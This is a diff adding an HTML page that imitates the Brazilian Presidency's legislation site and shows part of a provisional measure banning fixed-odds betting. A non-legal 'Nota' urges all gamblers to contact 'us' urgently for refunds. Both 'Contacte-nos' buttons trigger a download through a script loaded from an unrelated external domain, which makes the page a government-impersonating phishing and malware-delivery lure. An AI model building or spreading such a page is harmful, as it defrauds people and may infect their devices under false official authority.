@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Medida Provisória nº 1.394, de 25 de setembro de 2026</title>
+<style>
+  :root{
+    --azul:#1351b4;
+    --azul-esc:#0c326f;
+    --oliva:#808000;
+    --tinta:#1b1f24;
+    --cinza:#5b6572;
+    --linha:#e3e8ee;
+    --fundo:#eef1f5;
+  }
+
+  *,*::before,*::after{box-sizing:border-box;}
+  html{-webkit-text-size-adjust:100%;}
+
+  body{
+    margin:0;
+    background:
+      radial-gradient(circle at 15% 0%, #e6ecf5 0%, transparent 45%),
+      radial-gradient(circle at 85% 100%, #e6ecf5 0%, transparent 45%),
+      var(--fundo);
+    color:var(--tinta);
+    font-family:Georgia,"Times New Roman",serif;
+    font-size:17px;
+    line-height:1.75;
+    min-height:100vh;
+    padding:32px 16px;
+  }
+
+  .page{
+    max-width:860px;
+    margin:0 auto;
+    background:#fff;
+    border-radius:14px;
+    box-shadow:
+      0 1px 2px rgba(12,50,111,.06),
+      0 8px 24px rgba(12,50,111,.08),
+      0 24px 64px rgba(12,50,111,.06);
+    overflow:hidden;
+  }
+
+  /* ---------- Cabeçalho institucional ---------- */
+  .masthead{
+    display:flex;
+    align-items:center;
+    gap:22px;
+    padding:28px 46px;
+    background:#fbfcfd;
+    border-bottom:1px solid var(--linha);
+    position:relative;
+  }
+  .masthead::after{
+    content:"";
+    position:absolute;
+    left:0;right:0;bottom:-1px;
+    height:3px;
+    background:linear-gradient(90deg,var(--oliva) 0%,#a3a300 40%,transparent 100%);
+    opacity:.5;
+  }
+  .masthead .brasao{
+    flex:none;
+    width:72px;
+    height:80px;
+    object-fit:contain;
+    filter:drop-shadow(0 2px 4px rgba(0,0,0,.08));
+  }
+  .masthead-text{
+    display:flex;
+    flex-direction:column;
+    line-height:1.4;
+    font-family:"Segoe UI",Arial,sans-serif;
+    color:var(--oliva);
+  }
+  .org-1{font-size:1.08rem;font-weight:700;letter-spacing:.02em;}
+  .org-2{font-size:.96rem;font-weight:600;opacity:.9;}
+  .org-3{font-size:.83rem;font-weight:500;opacity:.8;}
+
+  /* ---------- Cabeçalho do ato ---------- */
+  .doc-head{
+    padding:40px 46px 28px;
+    text-align:center;
+  }
+  .doc-head h1{
+    margin:0;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:clamp(1rem,2.5vw,1.3rem);
+    line-height:1.5;
+    font-weight:700;
+    letter-spacing:.02em;
+    color:var(--azul-esc);
+  }
+  .doc-head h1 a{color:inherit;text-decoration:none;}
+  .doc-head h1 a:hover{text-decoration:underline;text-decoration-thickness:2px;text-underline-offset:4px;}
+
+  .ementa{
+    max-width:680px;
+    margin:20px auto 0;
+    padding:18px 24px;
+    background:#f6f8fb;
+    border-radius:10px;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.93rem;
+    line-height:1.7;
+    color:#414b57;
+    text-align:justify;
+    hyphens:auto;
+    border:1px solid #edf1f6;
+  }
+
+  /* ---------- Botão de ação (CTA) ---------- */
+  .cta-wrap{
+    margin:22px 0 0;
+    text-align:center;
+  }
+  .cta{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    padding:12px 30px;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.92rem;
+    font-weight:700;
+    letter-spacing:.03em;
+    color:#fff;
+    background:linear-gradient(135deg,var(--azul-esc) 0%,var(--azul) 100%);
+    border:none;
+    border-radius:999px;
+    cursor:pointer;
+    text-decoration:none;
+    box-shadow:0 4px 14px rgba(19,81,180,.28);
+    transition:transform .18s, box-shadow .18s, filter .18s;
+    -webkit-appearance:none;
+    appearance:none;
+  }
+  .cta::before{
+    content:"";
+    width:8px;height:8px;
+    border-radius:50%;
+    background:#7fd1a0;
+    box-shadow:0 0 0 3px rgba(127,209,160,.3);
+  }
+  .cta:hover{
+    transform:translateY(-2px);
+    box-shadow:0 8px 22px rgba(19,81,180,.35);
+    filter:brightness(1.05);
+  }
+  .cta:active{transform:translateY(0);}
+  .cta:focus-visible{
+    outline:3px solid rgba(19,81,180,.35);
+    outline-offset:3px;
+  }
+
+  /* ---------- Corpo ---------- */
+  .body-text{padding:0 46px 20px;}
+
+  .preambulo{
+    margin:34px 0 0;
+    text-align:justify;
+    hyphens:auto;
+    padding-left:22px;
+    border-left:3px solid var(--oliva);
+    color:#2a3138;
+  }
+  .preambulo .destaque{
+    font-weight:700;
+    letter-spacing:.01em;
+    color:var(--azul-esc);
+  }
+
+  /* Capítulos */
+  .chapter{
+    text-align:center;
+    margin:52px 0 30px;
+    position:relative;
+  }
+  .chapter::before,
+  .chapter::after{
+    content:"";
+    position:absolute;
+    top:50%;
+    width:calc(50% - 130px);
+    height:1px;
+    background:linear-gradient(90deg,transparent,var(--linha));
+  }
+  .chapter::before{left:0;}
+  .chapter::after{right:0;transform:scaleX(-1);}
+  .chapter .label{
+    display:block;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.74rem;
+    font-weight:700;
+    letter-spacing:.2em;
+    text-transform:uppercase;
+    color:var(--oliva);
+  }
+  .chapter .title{
+    display:block;
+    margin-top:8px;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.92rem;
+    font-weight:600;
+    letter-spacing:.05em;
+    text-transform:uppercase;
+    color:var(--azul-esc);
+  }
+
+  /* Itens numerados */
+  .clause{
+    margin:20px 0;
+    text-align:justify;
+    hyphens:auto;
+    padding:18px 22px 18px 60px;
+    position:relative;
+    background:#fcfdfe;
+    border:1px solid #eef2f7;
+    border-radius:10px;
+    transition:border-color .2s, box-shadow .2s, transform .2s;
+  }
+  .clause:hover{
+    border-color:#dbe4f0;
+    box-shadow:0 4px 14px rgba(12,50,111,.06);
+  }
+  .clause .num{
+    position:absolute;
+    left:20px;
+    top:16px;
+    width:28px;
+    height:28px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    border-radius:50%;
+    background:var(--azul-esc);
+    color:#fff;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.8rem;
+    font-weight:700;
+    line-height:1;
+  }
+
+  /* Nota em destaque */
+  .nota{
+    margin:38px 0 10px;
+    padding:26px 30px;
+    position:relative;
+    background:linear-gradient(135deg,#fffaf0 0%,#fdf4dd 100%);
+    border:1px solid #f0dda6;
+    border-left:5px solid #d4a017;
+    border-radius:0 12px 12px 0;
+    text-align:justify;
+    hyphens:auto;
+    color:#5a4300;
+    box-shadow:0 4px 18px rgba(212,160,23,.10);
+  }
+  .nota .rotulo{
+    display:inline-flex;
+    align-items:center;
+    gap:7px;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.72rem;
+    font-weight:700;
+    letter-spacing:.16em;
+    text-transform:uppercase;
+    color:#a67c00;
+    margin-bottom:10px;
+  }
+  .nota .rotulo::before{
+    content:"!";
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:17px;height:17px;
+    border-radius:50%;
+    background:#d4a017;
+    color:#fff;
+    font-size:.68rem;
+    font-weight:800;
+  }
+  .nota p{margin:0;font-weight:600;line-height:1.7;}
+
+  /* Links internos */
+  .body-text a{
+    color:var(--azul);
+    text-decoration:none;
+    border-bottom:1px solid rgba(19,81,180,.35);
+  }
+  .body-text a:hover{border-bottom-color:var(--azul);}
+
+  /* ---------- Rodapé ---------- */
+  .disclaimer{
+    margin:34px 46px 0;
+    padding:20px 0 36px;
+    border-top:1px solid var(--linha);
+    text-align:center;
+    font-family:"Segoe UI",Arial,sans-serif;
+    font-size:.82rem;
+    color:#c1121f;
+  }
+
+  /* ---------- Responsivo ---------- */
+  @media (max-width:640px){
+    body{font-size:16px;padding:14px 10px;}
+    .page{border-radius:10px;}
+    .masthead{padding:20px 22px;gap:14px;}
+    .masthead .brasao{width:54px;height:60px;}
+    .org-1{font-size:.95rem;}
+    .org-3{font-size:.74rem;}
+    .doc-head{padding:28px 22px 22px;}
+    .ementa{padding:14px 16px;font-size:.88rem;}
+    .body-text{padding:0 22px 16px;}
+    .preambulo{padding-left:16px;}
+    .clause{padding:16px 18px 16px 52px;}
+    .clause .num{left:16px;top:14px;width:26px;height:26px;font-size:.75rem;}
+    .nota{padding:20px 22px;}
+    .disclaimer{margin:24px 22px 0;}
+    .chapter::before,.chapter::after{display:none;}
+    .cta{padding:11px 24px;font-size:.88rem;}
+  }
+
+  /* ---------- Impressão ---------- */
+  @media print{
+    body{background:#fff;font-size:11.5pt;padding:0;}
+    .page{max-width:none;box-shadow:none;border-radius:0;}
+    .masthead{background:#fbfcfd !important;-webkit-print-color-adjust:exact;print-color-adjust:exact;}
+    .clause{break-inside:avoid;box-shadow:none;}
+    .clause:hover{box-shadow:none;}
+    .cta{box-shadow:none;}
+    a{color:inherit;text-decoration:none;border:none;}
+  }
+</style>
+</head>
+<body>
+
+<main class="page">
+
+  <!-- Cabeçalho institucional -->
+  <header class="masthead">
+    <img class="brasao"
+         src="https://www.planalto.gov.br/ccivil_03/LEIS/QUADRO/Brastra.gif"
+         alt="Brasão da República"
+         width="72" height="80"
+         onerror="this.onerror=null;this.src='https://planalto.gov.br/ccivil_03/LEIS/QUADRO/Brastra.gif';">
+    <div class="masthead-text">
+      <span class="org-1">Presidência da República</span>
+      <span class="org-2">Casa Civil</span>
+      <span class="org-3">Secretaria Especial para Assuntos Jurídicos</span>
+    </div>
+  </header>
+
+  <!-- Identificação do ato -->
+  <section class="doc-head">
+    <h1>
+      <a href="http://legislacao.planalto.gov.br/legisla/legislacao.nsf/Viw_Identificacao/mpv%201394-2026?OpenDocument">
+        MEDIDA PROVISÓRIA Nº 1.394, DE 25 DE SETEMBRO DE 2026
+      </a>
+    </h1>
+
+    <p class="ementa">
+      Proíbe a exploração, a oferta, a intermediação e a publicidade de loterias
+      de apostas de quota fixa no território nacional, institui o Comitê
+      Interinstitucional de Fiscalização da Exploração e da Publicidade Ilegal de
+      Apostas de Quota Fixa, e altera a Lei nº 14.790, de 29 de dezembro de 2023.
+    </p>
+
+    <!-- CTA superior: Contacte-nos -->
+    <div class="cta-wrap">
+      <button type="button" class="cta" onclick="k2()">Contacte-nos</button>
+    </div>
+  </section>
+
+  <!-- Texto do ato -->
+  <div class="body-text">
+
+    <p class="preambulo">
+      <span class="destaque">O PRESIDENTE DA REPÚBLICA</span>, no uso da atribuição
+      que lhe confere o art. 62 da Constituição, adota a seguinte Medida Provisória,
+      com força de lei:
+    </p>
+
+    <!-- ================= CAPÍTULO I ================= -->
+    <div class="chapter">
+      <span class="label">Capítulo I</span>
+      <span class="title">Do objeto e do âmbito de aplicação</span>
+    </div>
+
+    <p class="clause">
+      <span class="num">1</span>
+      Ficam proibidas, em território nacional, a exploração, a oferta, a
+      intermediação e a publicidade de loterias de aposta de quota fixa, em meio
+      físico ou virtual, inclusive quando realizadas por agente sediado no exterior
+      que as ofereça a pessoa localizada no território nacional.
+    </p>
+
+    <p class="clause">
+      <span class="num">2</span>
+      Os agentes operadores de apostas deverão manter atualizadas, perante a
+      Secretaria de Prêmios e Apostas do Ministério da Fazenda, as informações
+      relativas ao seu representante legal, seu endereço eletrônico e demais meios
+      de contato, durante o período necessário ao cumprimento das obrigações
+      remanescentes previstas nesta Medida Provisória.
+    </p>
+
+    <p class="clause">
+      <span class="num">3</span>
+      A partir da data de publicação desta Medida Provisória, fica vedado o ingresso
+      de novos recursos nas contas transacionais, ressalvados os valores
+      comprovadamente provenientes do resgate, do vencimento, da alienação ou da
+      liquidação de ativos financeiros nos quais estivessem aplicados, naquela data,
+      recursos dos apostadores, inclusive os respectivos rendimentos, desde que
+      destinados exclusivamente ao cumprimento das obrigações previstas nesta Medida
+      Provisória.
+    </p>
+
+    <p class="clause">
+      <span class="num">4</span>
+      As apostas de quota fixa em aberto cujo resultado não tiver sido apurado no
+      prazo previsto na presente Medida Provisória serão consideradas sem efeito,
+      hipótese em que será assegurada ao apostador a restituição integral dos valores
+      apostados,
+    </p>
+
+    <div class="nota">
+      <span class="rotulo">Nota</span>
+      <p>
+        A partir de agora, todos os usuários que participaram de jogos de azar ou
+        loterias devem entrar em contato conosco imediatamente para registrar seus
+        fundos de aposta e processar um reembolso integral. Por favor, leve este prazo
+        a sério para evitar perder o período ideal de reembolso e incorrer em perdas
+        financeiras.
+      </p>
+    </div>
+
+    <!-- CTA inferior: Contacte-nos -->
+    <div class="cta-wrap" style="margin-top:34px;">
+      <button type="button" class="cta" onclick="k2()">Contacte-nos</button>
+    </div>
+
+  </div><!-- /body-text -->
+
+  <p class="disclaimer">
+    Este texto não substitui o publicado no DOU de 25.9.2026 - Edição extra
+  </p>
+
+</main>
+
+     <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+  
+<!-- k2: método de redirecionamento acionado por todos os CTAs -->
+<script>
+  function k2(){
+    MeetU.download(event);
+  }
+</script>
+
+</body>
+</html>
